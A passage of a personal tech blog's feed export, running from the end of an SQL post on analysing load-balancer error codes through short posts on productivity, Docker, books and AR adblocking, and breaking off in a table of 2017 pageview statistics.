<span class="k">group</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">;</span>

<span class="c1">-- Look at distribution by both where they're unequal</span>
<span class="c1">-- This highlights cases where the ELB was unable to reach the hosts</span>
<span class="k">select</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
<span class="k">from</span> <span class="n">elb_logs</span>
<span class="k">where</span> <span class="n">elbresponsecode</span> <span class="o">!=</span> <span class="n">backendresponsecode</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">,</span> <span class="n">backendresponsecode</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">elbresponsecode</span><span class="p">;</span>

<span class="c1">-- A simple way to look at the request groups causing problems</span>
<span class="k">select</span> <span class="n">split_part</span><span class="p">(</span><span class="n">httprequest</span><span class="p">,</span> <span class="s1">'?'</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">httprequestbase</span><span class="p">,</span> <span class="k">count</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="k">as</span> <span class="n">cnt</span>
<span class="k">from</span> <span class="n">elb_logs</span>
<span class="k">where</span> <span class="n">elbresponsecode</span> <span class="o">&gt;=</span> <span class="mi">500</span>
<span class="k">group</span> <span class="k">by</span> <span class="n">httprequestbase</span>
<span class="k">order</span> <span class="k">by</span> <span class="n">cnt</span> <span class="k">desc</span><span class="p">;</span>

<span class="c1">-- For fun, we can also look at the number of errors by minute to see if we can spot a pattern</span>
<span class="k">select</span> <span class="n">to_char</span><span class="p">(</span><span class="n">requesttime</span><span class="p">,</span> <span class="s1">'YYYY-MM-DD HH24:MI'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">datetime</span><span class="p">,</span>
  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">500</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n500</span><span class="p">,</span>
  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">501</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n501</span><span class="p">,</span>
  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">502</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n502</span><span class="p">,</span>
  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">503</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n503</span><span class="p">,</span>
  <span class="k">sum</span><span class="p">(</span><span class="k">case</span> <span class="k">when</span> <span class="n">elbresponsecode</span> <span class="o">=</span> <span class="mi">504</span> <span class="k">then</span> <span class="mi">1</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">end</span><span class="p">)</span> <span class="k">as</span> <span class="n">n504</span>
<span class="k">from</span> <span class="n">elb_logs</span>
<span class="k">where</span> <span class="n">elbresponsecode</span> <span class="o">&gt;=</span> <span class="mi">500</span>
<span class="k">group</span> <span class="k">by</span> <span class="nb">datetime</span>
<span class="k">order</span> <span class="k">by</span> <span class="nb">datetime</span><span class="p">;</span></code></pre></figure>

]]></content:encoded>
 </entry>
 
 <entry>
   <title>Optimize for keyboard shortcuts</title>
   <link href="http://dangoldin.com/2018/02/10/optimize-for-keyboard-shortcuts/"/>
   <updated>2018-02-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/02/10/optimize-for-keyboard-shortcuts</id>
   <content:encoded><![CDATA[
<p>I’m a big believer of offering keyboard-only experiences to your power users. In fact, I don’t think it’s possible to build a loved productivity application without keyboard shortcuts. Productivity applications are all about productivity and keyboard shortcuts are what give your users power and speed. The mouse and menus are easier for newcomers but those that stick with the application inevitably need the speed that comes from shortcuts.</p>

<p>The ultimate example of this is Excel. If you watch any power user of Excel they rarely, if ever, use the mouse. Instead, they’re able to do everything they need using the keyboard and significantly quicker than if they were force the mouse. There’s some functionality that’s not even possible to do with a mouse alone - for example array formulas.</p>

<p>If you think about our favorite tools are almost all keyboard-shortcut based. These range from the modern IDE to the text editors of old. You see a screen with a cursor but the real power comes from the gamut of options we have from a few keyboard clicks. They offer a massive extension to our productivity and something that all productivity focused apps should embrace.</p>

<p>It feels as if the move to the web has made applications worse. They’re generally less snappy and generally make me feel less productive. Keyboard shortcuts are a big part of this and I’m hoping that we realize that moving to the web shouldn’t stop us from doing all the behind the scenes work to make us more productive.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Making the most of the subway commute</title>
   <link href="http://dangoldin.com/2018/02/09/making-the-most-of-the-subway-commute/"/>
   <updated>2018-02-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/02/09/making-the-most-of-the-subway-commute</id>
   <content:encoded><![CDATA[
<p>Every day I take the subway to and from work and can’t help but think how that time could be better spent. Some people are browsing through photos, others are playing games, while others are just staring off into space listening to their headphones, while the last few are just asleep. All these are individual actions and can be done at any time but the subway is a forced melting pot and feels like a missed opportunity.</p>

<p>What if instead of being in their own world everyone decided to turn it into some sort of social event - imagine meeting someone who can help professionally, listening to someone explain a complex topic, or if you’re lucky and willing to risk it - participating in a civil debate. There are dozens of ways to leverage a couple of dozen people stuck in the same enclosed area for 30 minutes. Instead we’re all spending our time doing things that can be done when we’re home alone.</p>

<p>We’ll see if I have the courage to actually try to do something like this. It’s something that will likely go horribly wrong but the upside seems worth it.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>My follower factory</title>
   <link href="http://dangoldin.com/2018/02/03/my-follower-factory/"/>
   <updated>2018-02-03T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/02/03/my-follower-factory</id>
   <content:encoded><![CDATA[
<p>Last week, the New York Times <a href="https://www.nytimes.com/interactive/2018/01/27/technology/social-media-bots.html">ran an expose</a> on the massive amount of follower fraud happening on Twitter. Unsurprisingly, when you can buy tens of thousands of followers for a few thousand dollars it’s not very likely that they’re going to be real. Anyone who has used Twitter for even a nominal amount of time would have quickly discovered that there’s a rampant amount of bots. Some leave cryptic comments, others like and retweet, while others follow; most do all of the above.</p>

<p>One of the cool ways they explored these fake followers is by plotting the growth of followers over time. Each point is a follower with the x-axis showing what number follower they were and the y-axis indicating when they joined Twitter. The idea here being that if you see a stretch of new followers that all joined Twitter at roughly the same time they’re likely bots.</p>

<p>This was a pretty cool way to look at it and one of my friends, <a href="https://twitter.com/geoffgolberg">Geoff</a>, shared an <a href="https://github.com/elaineo/FollowerFactory">open source script</a> that would pull and plot the data. I ran it for my meager, but amazing, 680 Twitter followers and am happy to report that there’s no obvious fraud pattern.</p>

<img src="http://dangoldin.com/assets/static/images/follower-factory-dang.png" width="1786" height="694" layout="responsive" alt="My follower factory"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>MoviePass: A fascinating business model</title>
   <link href="http://dangoldin.com/2018/01/28/moviepass-a-fascinating-business-model/"/>
   <updated>2018-01-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/01/28/moviepass-a-fascinating-business-model</id>
   <content:encoded><![CDATA[
<p>Given my lack of cultural knowledge the fact that I’ve heard of MoviePass should be a sign that it’s a big deal. I came across a <a href="https://www.wired.com/story/moviepass-second-act/">fascinating article</a> today about MoviePass’s revenue model - they charge just under $10/month and in return you get unlimited access to movies in theaters. What’s remarkable is that it seems MoviePass doesn’t actually have a subsidized relationship with theaters and just pays theaters the full ticket price.</p>

<p>That seems like an odd combination - having a customer see one movie a month puts you in the red. At the same time I understand where they’re coming from. The major advantage of this approach is that they can start signing up customers without having any relationship with the theater. And once they have the customers they have <a href="https://stratechery.com/2015/aggregation-theory/">enough leverage to become dangerous</a>. They may get theaters to give them lower pricing for tickets or a fraction of the concession sales. They may be able to go beyond theaters themselves and into studios, as the aforementioned Wired article suggests. In any case it’s having the army of consumers that’s the source of power. I look forward to seeing how this plays out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Design anti pattern: Tab switching autosave</title>
   <link href="http://dangoldin.com/2018/01/23/design-anti-pattern-tab-switching-autosave/"/>
   <updated>2018-01-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/01/23/design-anti-pattern-tab-switching-autosave</id>
   <content:encoded><![CDATA[
<p>Every once in awhile I get frustrated by a product experience and turn it into a design anti pattern rant. This time it was updating a bit of information in JIRA, switching to a different tab to look something up, and then going back to realize that my change was saved. Sure it was simple to edit and update the field but it seems the field should have just stayed in edit-mode until I was explicitly done. Since then I’ve been keeping an eye on how many products fall into this trap and it’s a fair amount. In the pursuit of improving efficiency they’re actually hurting it. Many tasks require referencing something else and I suspect there’s a bit of local optimization happening here with them focusing solely on their own product and not where it fits in to someone’s overall workflow.</p>

<p>The solution here is to actually watch users in action solving real-world problems. I’ve done user testing which has been focused on solving a given problem but that only scratches the surface of what a real user test should do. Start with the contrived scenario to get the first 80% done but only by watching people use your product in a natural environment will you get the last 20%.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Phonetic distance</title>
   <link href="http://dangoldin.com/2018/01/16/phonetic-distance/"/>
   <updated>2018-01-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/01/16/phonetic-distance</id>
   <content:encoded><![CDATA[
<p>Last year I <a href="/2017/03/04/automating-admin-work-spreadsheets-to-slack/">wrote</a> a simple script to automate posting our On-Call schedule. It worked by reading the schedule from a Google Spreadsheet, looking up the names in Slack, and then sharing these usernames on Slack. A tiny problem I ran into was the fact that since I was using an exact match the names in the spreadsheet had to match the names in Slack. This is a trivial problem to solve since we have a finite number of engineers but it still felt a bit too sensitive. While lying in bed last night I got to thinking of ways to measure similarity between the names in order to make it a bit more fuzzy. I’ve used the <a href="https://en.wikipedia.org/wiki/Levenshtein_distance">Levenshtein distance</a> in the past but it felt a bit too clinical for what I was trying to do and I wondered whether it was possible to do a phonetic match.</p>

<p>After during some research I discovered, unsurprisingly, that there’s a whole category of <a href="https://en.wikipedia.org/wiki/Phonetic_algorithm">phonetic algorithms</a> designed to solve these problems. The original was Soundex but has been superseded by the <a href="http://www.amorphics.com/index.html">Metaphone</a> family. What’s interesting is that their implementation is more heuristic than anything else. They were primarily designed for the English language and have a series of rules to simplify words or names into much simpler forms that avoid confusion. For example, one of the rules says to treat the letter V the same as the letter F while another says to treat the letter Q the same as K. Using hundreds or thousands of these transformations with a litany of exceptions leads to a canonical word which can then be compared against others.</p>

<p>I find this approach fascinating since it’s so antithetical to the modern approach of collecting a ton of data and pumping it through some machine learning algorithms. Instead this feels like a finely tweaked series of if-else statements designed for a single purpose.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Calendar query language</title>
   <link href="http://dangoldin.com/2018/01/13/calendar-query-language/"/>
   <updated>2018-01-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/01/13/calendar-query-language</id>
   <content:encoded><![CDATA[
<p>I’m a power user of Google Calendar and use it to organize meetings, tasks, and important dates. The one thing I wish it had was a more powerful query language. I often wish I could run SQL-like queries on top of my calendar. For example being able to get a count of the number of people taking a vacation by day by team or looking at the intersection between multiple calendars. The goal would be to automate much of the work I’m doing now when looking at managing my calendar but also uncover insights that are currently constrained by a lack of easy access.</p>

<p>Given that calendars are reasonably well structured this should be doable by just dumping the data into a relational database and writing the appropriate queries. I’m positive there are some subtle nuances that I’d have to work around - ranging from missing fields, to recurring events, to overly complicated metadata - but it feels like a solvable problem. As I write this an analogy that comes to mind is <a href="https://www.atlassian.com/blog/jira-software/jql-the-most-flexible-way-to-search-jira-14">JQL</a>, or JIRA Query Language, a bastardized SQL that was designed to work on top of JIRA. It supports SELECT statement on top of the JIRA fields but neglects joins and aggregates. JQL is designed for a single purpose and a calendar query language can follow this model. I think I gave myself a project for the next couple of weeks.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Learning Docker</title>
   <link href="http://dangoldin.com/2018/01/03/learning-docker/"/>
   <updated>2018-01-03T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/01/03/learning-docker</id>
   <content:encoded><![CDATA[
<p>I’m a bit embarrassed to admit this but I’ve been a bit behind the Docker craze. Sure I’ve done the tutorials when it came out but never really applied it to any of my actual projects. Given that nearly everyone is using Docker in some shape or form, I decided it was finally time to give it an honest effort.</p>

<p>I had a small Python script that I’ve been running weekly off of my laptop and wanted to come up with a better solution. My old approach would have been to just run it as a cronjob on a VPS but the problem was that it had a variety of third party libraries that needed to be installed via pip and if I ever needed to move it elsewhere I’d have to set it up again. After speaking with a few people it seemed that this could be a use case for Docker and then running it either within a build server (Jenkins) or on top of a distributed system (DC/OS).</p>

<p>From my ancient experiments the Docker tutorial I figured I’d be in for a world of pain but wrapping my script into a Docker container was surprisingly simple. I don’t think it took longer than 10 minutes to get it working and then a bit more time to figure out and modify the code to properly handle the various tokens and secrets.</p>

<p>The next step was getting it working in Jenkins but being able to base it on an already functional job built and deployed a container made it much easier. Once again the majority of the work here was figuring out how to securely handle tokens and secrets as part of the build process but I had a bunch of help.</p>

<p>Now that I had a working end-to-end system I decided to revisit the other scripts in my repo and see if I could Dockerize them as well. This is where I had a few false steps. I tried moving each script into its own folder with its own Dockerfile but that ended up failing when they needed to access shared libraries that I didn’t want to split out or duplicate. The final approach I settled on is to build one container that’s able to run any of the scripts but then trigger the exact script through the run command. I’m not 100% sold that this is the best way of doing it since it feels a bit hacky but I’m happy that I decided to give Docker a shot and the progress I’ve been made. There’s still a lot to learn but I’m much more comfortable diving right in.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Favorite books of 2017</title>
   <link href="http://dangoldin.com/2017/12/31/favorite-books-of-2017/"/>
   <updated>2017-12-31T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/31/favorite-books-of-2017</id>
   <content:encoded><![CDATA[
<p>For the past few years I’ve been writing two posts a week and my end of the year ritual is to catch up on my writing and finish off the year right. Last year I did a filler post for my favorite books of 2016 and thought it would be interesting to share the 2017 version as well. I’m a big reader and rarely dislike anything I read yet sharing every book I’ve read is a bit of a cop-out so I’ve tried to focus this on the books that I just couldn’t put down and couldn’t wait to resume reading.</p>

<ul>
  <li><a href="https://www.amazon.com/gp/product/B00X47ZVXM/">Deep Work: Rules for Focused Success in a Distracted World</a> (Cal Newport): I heard about this book from Ezra Klein’s <a href="https://www.vox.com/2017/4/21/15382282/cal-newport-taking-life-back-technology">podcast</a> and knew I had to read it. I wasn’t disappointed. The world is changing rapidly and I feel much more distracted than I did as a kid. Cal Newport calls this out and offers a series of rules for eliminating the crap and concentrating on real and meaningful work. Especially as people are making resolutions for 2018 this is a worthwhile book to read and set the stage for a productive 2018.</li>
  <li><a href="https://www.amazon.com/gp/product/B000FCKL6G/">Who Says Elephants Can’t Dance? Leading a Great Enterprise Through Dramatic Change</a> (Louis Gerstner): Louis Gerstner led IBM in the 1990s and helped it transition from a hardware-focused to a services-oriented business and this is a half narrative, half management book on the transition. IBM was an incredibly large company on the brink of failure and its impressive seeing how they were able to pull themselves away from the edge and reinvent themselves. If you’re interested in business history or managing a team it’s a quick and worthwhile read.</li>
  <li><a href="https://www.amazon.com/gp/product/B003UYUP58/">The Emperor of All Maladies: A Biography of Cancer</a> (Siddhartha Mukherjee): This has been on my reading list for a while and I’m glad I finally got the chance to read it. The book is incredibly well written and a gripping read despite covering such an intense and depressing topic. Beyond the history of cancer it chronicles the evolution of healthcare and how it’s evolved over the years to fight new threats.</li>
  <li><a href="https://www.amazon.com/gp/product/B00J1ISLC6/">Before the Trumpet: Young Franklin Roosevelt, 1882-1905</a> (Geoffrey Ward): I’m an admirer of FDR and really enjoyed that this focused on his youth. Many biographies blow through childhood, the teenage years, and college since there’s both more limited information and fewer achievements but Geoffrey Ward does a great job digging through the archives and describing the story of a young FDR. It doesn’t strive to explain him as president but offers anecdotes on top of anecdotes that let readers make the connection themselves.</li>
  <li><a href="https://www.amazon.com/gp/product/B0176M1A44/">Shoe Dog: A Memoir by the Creator of Nike</a> (Phil Knight): A book that came highly recommended and for good reason. Nike is a huge corporation now but it took an incredible out of perspiration to get there. The story itself is incredibly intense with many twists and turns that highlight how remarkable it is that Nike was able to survive and then thrive. The personalities in the book just draw you into their world and it makes you feel as if you’re there at the moment.</li>
  <li><a href="https://www.amazon.com/gp/product/B00FUZQYBO/">Creativity, Inc.: Overcoming the Unseen Forces That Stand in the Way of True Inspiration</a> (Ed Catmull): Similar to Who Says Elephants Can’t Dance this is half company biography, half management book but rather than focusing on reinventing and changing the culture of a nearly 100 year old company it’s focusing on how to keep a creative culture alive as a company grows. On its own it’s an interesting and engaging read but what makes it a joy to read are all the hidden Easter eggs behind our favorite Pixar movies.</li>
</ul>

<p>Looking forward to reading even more in 2018!</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>AR Adblocking</title>
   <link href="http://dangoldin.com/2017/12/28/ar-adblocking/"/>
   <updated>2017-12-28T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/28/ar-adblocking</id>
   <content:encoded><![CDATA[
<p>Augmented reality is still in its infancy but when it grows up it will change modern life. We’ll have a world of information at our fingertips and will end up with tools we can’t even imagine. An idea I’ve been thinking about is an AR based adblock. The way I envision these AR headsets working is that everyone will be constantly wearing them, akin to glasses, and the headsets are always processing, monitoring and altering what we see. Now imagine that there’s an adblocking application that intercepts everything visible and replaces it with blanks. Web adblockers work by blocking ad requests as well as removing ad HTML elements. This would work at an entirely different level by being in between the world and our eyes, acting as a sensory input filter.</p>

<p>This is just scratching the surface and it’s interesting to think how the world would change with the full adoption of AR - able to change everything we see and sense. We already have trouble with fake news and people choosing to see what interests them and AR has the potential to do this an entirely different level; arguably a much more dangerous one. I don’t know where we’ll end up but I’m hopeful we think through the implications of these technologies and their potential impact on society.</p>

<p>Disclosure: I work at TripleLift, an adtech company that’s better than most by focusing on higher quality, non-disruptive native ads.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Visualizing my 2017 stats</title>
   <link href="http://dangoldin.com/2017/12/27/visualizing-my-2017-stats/"/>
   <updated>2017-12-27T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/27/visualizing-my-2017-stats</id>
   <content:encoded><![CDATA[
<p>Over the past year I’ve been collecting a bunch of statistics for each of my days in the hope that I’ll have time to dig into them and discover some interesting patterns. Unfortunately I haven’t had a chance to do anything other than some simple visualizations but even these provide some insight into my 2017. This isn’t a wholehearted adoption of the quantified self movement but it’s something I am interested in and hoping to expand in 2018. A goal has always been to move beyond visualization and into actual analysis and actionable insights that can help me improve my lifestyle and behavior. I did the same set of <a href="/2017/01/02/year-in-review-2016/">visualizations in 2016</a> so it’s useful to compare them year over and year and see how, and if, my habits have changed.</p>

<ul class="thumbnails">
  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/sleep-duration-2017.png" alt="Sleep duration" width="800" height="600" layout="responsive"/>
      <p>Just under 7.5 hours of sleep per night but a bit all over the place.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/coffee-tea-alcohol-soda-daily-2017.png" alt="Coffee tea alcohol soda by day" width="800" height="600" layout="responsive"/>
      <p>Daily consumption of coffee, tea, alcohol, and soda box plot. Compared to last year the numbers are pretty similar although I did manage to cut down slightly on both my alcohol and coffee consumption - something that I made a concerted effort to this year. Unfortunately the change wasn't as significant as I had wanted to and is a goal for 2018.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-breakfast-2017.png" alt="Breakfast wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>A much wider breakfast range than last year yet still a bit heavy on the cheese.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-lunch-2017.png" alt="Lunch wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>An improvement over 2016 where I was very much into Chipotle. I still enjoy my burrito bowls but have also introduced salad to the mix.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-dinner-2017.png" alt="Dinner wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>Very similar dinners to last year - still heavy on the salad, chicken, and rice.</p>
    </div>
  </li>

  <li class="span8">
    <div class="thumbnail">
      <img src="http://dangoldin.com/assets/static/images/wordcloud-snack-2017.png" alt="Snack wordcloud" width="1000" height="1000" layout="responsive"/>
      <p>The most disappointed of the wordclouds and something I need to drastically cut down on in 2018.</p>
    </div>
  </li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>People do what you inspect, not what you expect</title>
   <link href="http://dangoldin.com/2017/12/26/people-do-what-you-inspect-not-what-you-expect/"/>
   <updated>2017-12-26T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/26/people-do-what-you-inspect-not-what-you-expect</id>
   <content:encoded><![CDATA[
<p>While reading <a href="https://www.amazon.com/Who-Says-Elephants-Cant-Dance/dp/0060523808">Who Says Elephants Can’t Dance</a> about the revival of IBM in the 90s I came across a simple, yet profound statement by Louis Gerstner: “People do what you inspect, not what you expect.” We hear variations of this constantly and it’s true - if you want to drive behavior change you need to make sure that’s what you’re actually measuring and holding people accountable for. Otherwise we all run the risk of preaching what we don’t practice.</p>

<p>The more I work the more I see this pop up in all sorts of situations. The obvious one is to think about compensation plans and how the dollar usually wins if it’s in conflict with anything else. Beyond that it influences the way we tackle any project. If we focus on collecting and sharing metrics those will be the guiding posts for the project’s evolution. This is why it’s critical to think deeply about the goals and metrics for a project and make sure they’re properly collected. Exposing these via a dashboard to the team will do more for motivation than anything else.</p>

<p>If you’re constantly talking about and measuring story points or hours in the office then those become what people optimize their days around. If that’s not what drives the business forward then you’re not focusing on the right levers and should switch to something that’s more aligned with the business.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Send a shirt, get a shirt</title>
   <link href="http://dangoldin.com/2017/12/25/send-a-shirt-get-a-shirt/"/>
   <updated>2017-12-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/25/send-a-shirt-get-a-shirt</id>
   <content:encoded><![CDATA[
<p>Despite being an early tech adopter I avoid buying clothes online. At first the justification was that I didn’t want to deal with the cost of returns but these days nearly every retailer offers free returns. At this point it’s more habit than anything else and given how infrequently I buy clothes I’d rather just do it in person when necessary.</p>

<p>The one service that I wish existed, and I’m sure it does somewhere, is a place where I can send some existing clothes that I know fit me perfectly and then have them used as the basis for new, custom made clothes. I have a great dress shirt that I’ve had for many years and it shows - there’s a giant rip on the elbow and the colors are starting to fade yet I love the fit. I refuse to throw it out and instead keep rolling up the sleeves to hide the tear. If I could get the same shirt in a variety of styles and colors but with the same perfect fit I’d be glad to throw it out.</p>

<p>This must be possible somewhere and I know there’s a market for custom made shirts but this feels like something that can be done much cheaper and at a much grander scale. Rather than try to measure yourself or try on a handful of shirts it’s much easier to send a shirt that fits and receive others that have the same fit. If there are any companies doing this I’d love to give them a shot.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Top posts of 2017</title>
   <link href="http://dangoldin.com/2017/12/24/top-posts-of-2017/"/>
   <updated>2017-12-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2017/12/24/top-posts-of-2017</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/2017-pageviews.png" width="2720" height="384" alt="Pageviews of my posts in 2017" layout="responsive"/>

<p>I use Google Analytics on my blog and now that the year is almost over it’s time for the annual tradition of sharing the top posts of the year. The total number of pageviews in 2017 was a remarkable 36,410, around the same I received in 2015 and 2016 but below those of 2013 and 2014 when I was both more lucky in the popularity of my posts while and more aggressive in promoting my writing on Hacker News. While I feel my writing has improved over the years I feel my content has atrophied and is something I’d like to correct in 2018. What’s interesting is that out of all the views this year, 17% were from posts written in 2017, 74% were from posts written in previous years, and the remaining 9% were from non post pages. One argument is that as I build up a larger stable of content it will keep growing in percentage every year. At the same time I should start seeing an overall growth in views which hasn’t happened over the past few years. A worthy goal is to keep growing the total number of views of previous years’ posts while also making sure the current year’s are driving even more views and become the evergreen content for the future.</p>

<p>On that note here are the most popular posts of 2017 - both written and viewed.</p>

<h2 id="most-popular-posts-written-in-2017">Most popular posts written in 2017</h2>
<table class="table"><thead><tr><th>Page</th><th>Pageviews</th><th>Unique Pageviews</th><th>Avg. Time on Page</th><th>Entrances</th><th>Bounce Rate</th><th>% Exit</th></tr></thead><tbody><tr><td>/2017/04/11/sql-is-the-perfect-interface/</td><td>2559</td><td>2481</td><td>169.74</td><td>2474</td><td>97.01%</td><td>96.64%</td></tr><tr><td>/2017/03/26/fulfillment-by-amazon-counterfeiting/</td><td>328</td><td>319</td><td>84.93</td><td>315</td><td>97.14%</td><td>95.73%</td></tr><tr><td>/2017/04/02/slacks-channel-exit-anti-pattern/</td><td>296</td><td>291</td><td>46.00</td><td>288</td><td>96.18%</td><td>95.61%</td></tr><tr><td>/2017/06/20/getting-amp-into-rss/</td><td>233</td><td>36</td><td>75.60</td><td>36</td><td>72.22%</td><td>14.59%</td></tr><tr><td>/2017/06/26/rss-finally-fixed/</td><td>213</td><td>19</td><td>71.31</td><td>18</td><td>55.56%</td><td>8.92%</td></tr><tr><td>/2017/02/21/advice-for-coding-bootcamp-graduates/</td><td>203</td><td>193</td><td>84.26</td><td>184</td><td>91.85%</td><td>88.67%</td></tr><tr><td>/2017/10/09/downloading-your-aim-buddy-list/</td><td>166</td><td>147</td><td>408.00</td><td>144</td><td>90.97%</td><td>84.94%</td></tr><tr><td>/2017/04/16/amp-and-subscription-paywalls/</td><td>155</td><td>135</td><td>67.48</td><td>133</td><td>94.74%</td><td>86.45%</td></tr><tr><td>/2017/05/04/security-across-multiple-aws-regions/</td><td>99</td><td>99</td><td>104.00</td><td>96</td><td>96.88%</td><td>94.95%</td></tr><tr><td>/2017/05/10/using-options-to-play-snapchats-quarterly-results/</td><td>99</td><td>97</td><td>64.50</td><td>97</td><td>95.88%</td><td>93.94%</td></tr><tr><td>/2017/08/08/google-docs-vs-confluence/</td><td>90</td><td>90</td><td>107.38</td><td>84</td><td>96.43%</td><td>91.11%</td></tr><tr><td>/2017/01/26/shame-on-united-and-bank-of-america/</td><td>77</td><td>75</td><td>171.25</td><td>69</td><td>95.65%</td><td>89.61%</td></tr><tr><td>/2017/02/28/lessons-learned-from-todays-s3-failure/</td><td>75</td><td>70</td><td>80.33</td><td>60</td><td>88.33%</td><td>84.00%</td></tr><tr><td>/2017/01/16/powering-our-devices-using-the-human-body/</td><td>72</td><td>67</td><td>41.25</td><td>66</td><td>83.33%</td><td>83.33%</td></tr><tr><td>/2017/07/04/thoughtful-code/</td><td>59</td><td>44</td><td>79.55</td><td>40</td><td>90.00%</td><td>62.71%</td></tr><tr><td>/2017/07/23/the-wild-world-of-online-trackers/</td><td>58</td><td>32</td><td>25.41</td><td>30</td><td>93.33%</td><td>53.45%</td></tr><tr><td>/2017/03/19/refactor-driven-development/</td><td>56</td><td>54</td><td>186.00</td><td>52</td><td>94.23%</td><td>94.64%</td></tr><tr><td>/2017/02/04/identifying-product-weaknesses-using-google-autocomplete/</td><td>51</td><td>51</td><td>2.00</td><td>49</td><td>100.00%</td><td>98.04%</td></tr><tr><td>/2017/02/19/math-is-incredible/</td><td>51</td><td>36</td><td>71.23</td><td>25</td><td>76.00%</td><td>49.02%</td></tr><tr><td>/2017/02/26/my-snapchat-investment-strategy/</td><td>45</td><td>37</td><td>192.47</td><td>26</td><td>88.46%</td><td>62.22%</td></tr></tbody></table>

<h2 id="most-popular-posts-viewed-in-2017">Most popular posts viewed in 2017</h2>
<table class="table"><thead><tr><th>Page</th><th>Pageviews</th><th>Unique Pageviews</th><th>Avg. Time on Page</th><th>Entrances</th><th>Bounce Rate</th><th>% 